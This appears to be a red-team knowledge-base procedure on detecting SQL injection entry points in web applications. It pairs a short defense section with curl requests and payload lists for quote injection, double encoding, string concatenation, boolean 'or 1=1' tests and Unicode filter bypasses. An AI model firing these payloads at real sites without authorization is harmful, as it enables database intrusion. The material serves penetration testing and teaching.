---
id: 25642eb6-18fd-42a6-a9e6-f3bf7a62c65b
name: SQL-Injection-Entry-Point-Detection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.114951+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Entry point detection]]'
  - '[[tags/SQL Injection]]'
  - web-vulnerability
  - bypass-techniques
commands:
  - '[[commands/curl-sql-special-characters-test]]'
platforms:
  - Web
tools: []
validated: true
---

# SQL-Injection-Entry-Point-Detection

## Summary

This procedure outlines methods to detect potential SQL injection entry points in web applications by testing input fields with special characters, encoded payloads, string concatenation techniques, logic-based payloads, and Unicode transformations. It helps identify vulnerabilities where user input is not properly sanitized, allowing attackers to manipulate SQL queries for data extraction or control.

## Description

SQL injection (SQLi) vulnerabilities occur when web applications fail to properly validate or sanitize user inputs before incorporating them into SQL queries, enabling attackers to inject malicious SQL code. This procedure focuses on detecting entry points such as login forms, search fields, or URL parameters by systematically testing bypass techniques. These include direct injection of special characters to break query syntax, using URL or double encoding to evade filters, concatenating strings to reconstruct payloads, testing boolean logic to confirm query influence, and transforming Unicode characters to mimic standard SQL operators. In a red team context, this is used during reconnaissance and initial access phases to map exploitable parameters on public-facing web apps. Success is indicated by anomalous responses like error messages, unexpected data dumps, or boolean true/false behaviors.

## Requirements

1. Network access to the target web application (e.g., via browser or proxy).
2. Tools for intercepting and modifying HTTP requests, such as [[tools/Burp-Suite]] or curl.
3. Basic knowledge of HTTP requests and SQL syntax.
4. A proxy or developer tools to observe responses for errors or leaks.

## Defense

- Use parameterized queries or prepared statements in application code to separate SQL logic from user input.
- Implement web application firewalls (WAFs) to detect and block common SQLi patterns.
- Perform input validation, sanitization, and escaping on all user-supplied data.
- Regularly scan for vulnerabilities using tools like sqlmap or OWASP ZAP and apply patches.

## Objectives

1. Identify input fields susceptible to SQL injection by observing response changes.
2. Bypass basic filters using encoding and transformation techniques to confirm vulnerability depth.
3. Gather evidence of SQL query influence, such as database errors or data manipulation.
4. Document vulnerable parameters for further exploitation in an attack chain.

## Instructions

### Step 1: Test Special Characters for Query Breaking

**Context**: Start by injecting common SQL delimiters and operators into input fields (e.g., URL parameters, form fields) to check if they disrupt the SQL query, often revealing error messages or syntax issues that confirm an entry point.

**Code** ([[codes/SQL-Special-Characters-and-Encodings]]):

Use the following payloads in requests:

```sql
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content
```

**Command** ([[commands/curl-sql-special-characters-test]]):

Intercept or send a request to a parameter like ?id=1 using curl:

```bash
curl -X GET "http://target.com/page?id=$_PAYLOAD" -v
```

> Replace $_PAYLOAD with each special character (e.g., '). Observe the response for SQL errors like "unclosed quotation mark" or unexpected behavior, indicating the input reaches the SQL layer without sanitization.

### Step 2: Test Encoded Payloads for Filter Evasion

**Context**: If direct special characters are filtered, apply URL or double encoding to disguise them, testing if the application decodes inputs before querying the database.

**Code** ([[codes/SQL-Double-Encoded-Apostrophe]]):

```sql
%%2727
%25%27
```

Inject these into the same parameter and send the request. Double encoding (%25 is '%') can bypass simplistic filters that only decode once.

> Expected response: If vulnerable, the decoded payload breaks the query similarly to Step 1, but without triggering client-side filters.

### Step 3: Test String Concatenation Bypasses

**Context**: Attempt to reconstruct malicious payloads using SQL concatenation operators to merge fragmented inputs, evading keyword-based blocks.

**Code** ([[codes/SQL-String-Concatenation-Examples]]):

```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

Modify inputs to use these operators (e.g., in a search field: ' || '1'='1). This tests if the app allows operator injection to alter query logic.

> Success is shown by full page results (true condition) instead of no results, confirming concatenation influences the query.

### Step 4: Perform Logic-Based SQL Injection Testing

**Context**: Use boolean conditions to verify if inputs affect SQL logic without causing errors, distinguishing true vulnerabilities from false positives.

**Code** ([[codes/SQL-Injection-Logic-Test-Payloads]]):

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

Append these to URL parameters (e.g., ?id=1' or 1=1 --) and compare responses: "true" payloads should return all records, "false" none.

> This step confirms injectable entry points by demonstrating query manipulation without syntax errors.

### Step 5: Test Unicode Character Transformations

**Context**: Employ Unicode lookalikes for SQL operators to bypass character-set filters, transforming them to standard ASCII equivalents in the backend.

**Code** ([[codes/SQL-Unicode-to-ASCII-Transformation]]):

```sql
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')
```

Encode Unicode variants (e.g., %CA%B9 for ') and inject. If the database normalizes them, it may allow injection.

> Look for the same error or logic changes as in prior steps, indicating transformation enables bypass.
